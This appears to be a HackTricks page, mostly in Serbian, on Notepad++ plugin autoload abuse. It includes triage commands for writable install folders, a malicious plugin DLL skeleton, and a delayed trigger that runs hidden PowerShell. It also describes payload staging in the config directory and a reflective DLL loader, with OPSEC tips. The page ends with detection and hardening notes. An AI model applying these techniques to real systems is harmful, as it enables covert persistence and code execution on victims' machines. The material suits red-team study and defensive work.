# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ će pri pokretanju **autoloadovati svaki plugin DLL koji pronađe u svojim `plugins` podfolderima**. Ubacivanje zlonamernog plugina u bilo koju **Notepad++ instalaciju u koju je moguće pisati** omogućava izvršavanje koda unutar `notepad++.exe` svaki put kada se editor pokrene, što se može zloupotrebiti za **persistence**, prikriveni **initial execution**, ili kao **in-process loader** ako je editor pokrenut elevated.

Od **Notepad++ 7.6+** očekivani raspored za ručnu instalaciju je **jedan podfolder po pluginu** (`plugins\<PluginName>\<PluginName>.dll`). U **portable mode** (prisustvo `doLocalConf.xml` pored `notepad++.exe`), cela aplikaciona struktura ostaje lokalna u tom direktorijumu, što često kopirane/admin tool bundle-ove pretvara u lako korisnički upisiv surface za izvršavanje.

## Writable plugin locations
- Standard install: `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (obično zahteva admin prava za upis).
- Writable opcije za operatore sa niskim privilegijama:
- Koristite **portable Notepad++ build** u folderu u koji korisnik može da piše.
- Kopirajte `C:\Program Files\Notepad++` na putanju koju kontroliše korisnik (npr. `%LOCALAPPDATA%\npp\`) i pokrenite `notepad++.exe` odatle.
- Tražite **admin tool bundles**, raspakovane zip kopije ili help-desk toolkit-ove koji već sadrže `doLocalConf.xml` i nalaze se van `Program Files`.
- Svaki plugin dobija sopstveni podfolder pod `plugins` i automatski se učitava pri startup-u; stavke menija se pojavljuju pod **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Tačke učitavanja plugina (primitives izvršavanja)
Notepad++ očekuje određene **exported functions**. Sve se pozivaju tokom inicijalizacije, što daje više površina za izvršavanje:
- **`DllMain`** — pokreće se odmah pri učitavanju DLL-a (prva tačka izvršavanja).
- **`setInfo(NppData)`** — poziva se jednom pri učitavanju da bi se Notepad++-u prosledili handle-ovi; tipično mesto za registraciju stavki menija.
- **`getName()`** — vraća ime plugina prikazano u meniju.
- **`getFuncsArray(int *nbF)`** — vraća komande menija; čak i ako je prazno, poziva se tokom startovanja.
- **`beNotified(SCNotification*)`** — prima Notepad++ / Scintilla događaje (korisno za odlaganje payload-a do korisničke akcije ili događaja editora).
- **`messageProc(UINT, WPARAM, LPARAM)`** — handler poruka, koristan za veće razmene podataka.
- **`isUnicode()`** — kompatibilnosna zastavica koja se proverava pri učitavanju.

Većina export-ova može da se implementira kao **stubs**; izvršavanje može da krene iz `DllMain` ili bilo kog callback-a iznad tokom autoload.

## Minimalna malicious plugin skeleton
Kompajliraj DLL sa očekivanim export-ovima i postavi ga u `plugins\\MyNewPlugin\\MyNewPlugin.dll` unutar writable Notepad++ foldera:
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Izgradite DLL (Visual Studio/MinGW).
2. Kreirajte podfolder za plugin unutar `plugins` i ubacite DLL unutra.
3. Ponovo pokrenite Notepad++; DLL se automatski učitava, izvršavajući `DllMain` i naknadne callback-ove.

## Low-noise trigger pattern via `beNotified`
Za OPSEC, mnogi payload-i ne bi trebalo da se aktiviraju iz `DllMain`. Tiši obrazac je da se plugin učita normalno, a zatim da se izvrši tek nakon realnog događaja u editoru, kao što su **startup complete**, **buffer activation** ili **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Ovo se bolje poklapa sa javnim ofensivnim istraživanjem nego bučan `DllMain` beacon: DLL se i dalje autoloaduje pri startup-u, ali se zlonamerna akcija odlaže dok Notepad++ zaista ne izgleda kao da se koristi.

## Using the plugin config directory as secondary storage
Notepad++ izlaže `NPPM_GETPLUGINSCONFIGDIR`, koji vraća **plugin configuration directory trenutnog korisnika**. Zlonamerni plugin može da koristi ovo da DLL na disku ostane minimalan, dok čuva enkriptovani config, staged payloads ili tasking fajlove u putanji koja se uklapa sa normalnim plugin state.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Operativno, ovo je korisno kada želite:
- mali autoloaded bootstrap DLL;
- tasking po korisniku bez ponovnog diranja glavnog plugin binara;
- da odvojite **autoload trigger** od težeg drugog stage-a.

## Reflective loader plugin pattern
Weaponized plugin može pretvoriti Notepad++ u **reflective DLL loader**:
- Prikaže minimalan UI/menu unos (npr. "LoadDLL").
- Prihvata **file path** ili **URL** da preuzme payload DLL.
- Reflectively mapira DLL u trenutni proces i poziva exported entry point (npr. loader funkciju unutar preuzetog DLL-a).
- Prednost: ponovna upotreba benigno izgleda GUI procesa umesto pokretanja novog loader-a; payload nasleđuje integritet `notepad++.exe` (uključujući elevated contexts).
- Trade-offs: ostavljanje **unsigned plugin DLL** na disk je upadljivo; praktična varijacija je da se autoloaded plugin koristi samo kao stub, a da pravi implant ostane enkriptovan/staged negde drugde.

## Detection and hardening notes
- Blokirajte ili nadzirite **writes to Notepad++ plugin directories** (uključujući portable kopije u user profile-ovima); omogućite controlled folder access ili application allowlisting.
- Alarmirajte na **new unsigned DLLs** u `plugins`, promene na portable Notepad++ stablima i neuobičajenu **child processes/network activity** od `notepad++.exe`.
- Napravite baseline legitimnih pluginova i istražite svaki novi DLL koji eksportuje normalan Notepad++ plugin interface, ali takođe pokreće shells, PowerShell ili network beacons.
- Primorajte instalaciju pluginova samo preko **Plugins Admin**, i ograničite izvršavanje portable kopija iz untrusted path-ova.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
